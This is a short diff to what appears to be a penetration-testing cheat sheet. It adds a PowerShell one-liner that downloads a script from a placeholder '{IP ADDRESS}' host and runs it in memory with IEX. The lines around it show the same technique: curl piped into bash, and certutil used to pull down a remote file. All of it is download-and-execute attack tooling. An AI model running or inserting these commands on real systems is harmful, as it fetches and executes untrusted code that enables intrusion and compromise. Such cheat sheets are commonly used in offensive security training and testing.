@@ -730,6 +730,9 @@ curl {IP ADDRESS}/{FILE}
 # Linux - Download file and execute in bash:
 curl {IP ADDRESS}/{FILE.sh} | bash
 
+# Windows - Download file and execute in powershell:
+powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/{FILE}")'
+
 # Windows - Download file using certutil
 certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
 
